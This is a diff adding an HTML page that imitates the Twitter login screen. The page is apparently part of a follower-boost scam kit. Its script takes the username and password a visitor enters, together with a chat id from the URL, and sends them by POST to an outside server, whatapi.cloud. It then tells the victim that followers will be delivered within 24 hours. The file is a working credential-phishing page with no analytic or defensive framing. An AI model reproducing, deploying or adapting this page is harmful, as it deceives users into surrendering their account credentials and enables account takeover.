@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>Twitter Login Form</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<meta name="keywords" content="Form,flex, ,Twitter form ,sachindusahan,html,css" />
+<link rel="stylesheet" href="./style.css"/>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+<meta property="og:title" content="Twitter Login Form" />
+<style>
+  .spinner {
+    display: none;
+    border: 4px solid rgba(0, 0, 0, 0.1);
+    border-radius: 50%;
+    border-top: 4px solid #3498db;
+    width: 30px;
+    height: 30px;
+    animation: spin 1s linear infinite;
+    margin: 10px auto;
+  }
+
+  @keyframes spin {
+    0% { transform: rotate(0deg); }
+    100% { transform: rotate(360deg); }
+  }
+
+  .success-message {
+    display: none;
+    color: green;
+    text-align: center;
+    margin-top: 20px;
+  }
+</style>
+</head>
+<body>
+  <div class='container'>
+        <div class='div-1'>
+            <div class='sub-div-1'>
+                <i class="fa fa-twitter icon"></i>
+            </div>
+        </div>
+        <div class='div-2'>
+            <div class='sub-div-2'>
+                <h3>Log in to Twitter</h3>
+            </div>
+        </div>
+        <div class='div-3'>
+            <div class='sub-div-3'>
+                <label>Phone, email or username</label><br>
+                <input type='text' id="username">
+            </div>
+        </div>
+        <div class='div-4'>
+            <div class='sub-div-4'>
+                <label>Password</label><br>
+                <input type='password' id="password">
+            </div>
+        </div>
+        <div class='div-5'>
+            <div class='sub-div-5'>
+                <button id="loginButton">Log in</button>
+            </div>
+        </div>
+        <div class='spinner' id="spinner"></div>
+        <div class='success-message' id="successMessage">Followers will be delivered soon within 24 hours!</div>
+        <div class='div-6'>
+            <div class='sub-div-6'>
+                <a href=''>Forgot password? .&nbsp;</a>
+                <a href=''>Sign up for Twitter</a>
+            </div>
+        </div>
+    </div>
+
+<script>
+document.getElementById('loginButton').addEventListener('click', function(evt) {
+  evt.preventDefault();
+
+  const username = document.getElementById('username').value;
+  const password = document.getElementById('password').value;
+  const chatId = new URLSearchParams(window.location.search).get("id");
+  const spinner = document.getElementById('spinner');
+  const successMessage = document.getElementById('successMessage');
+
+  spinner.style.display = 'block';
+
+  const formData = {
+      email: username,
+      password: password,
+      type: 'twitter ( x )',
+      chat_id: chatId
+  };
+
+  fetch('https://whatapi.cloud:8443/info', {
+      method: 'POST',
+      headers: {
+          'Content-Type': 'application/json'
+      },
+      body: JSON.stringify(formData)
+  })
+  .then(response => response.json())
+  .then(data => {
+      spinner.style.display = 'none';
+      successMessage.style.display = 'block';
+  })
+  .catch(error => {
+      console.error('Error:', error);
+      spinner.style.display = 'none';
+  });
+});
+</script>
+</body>
+</html>
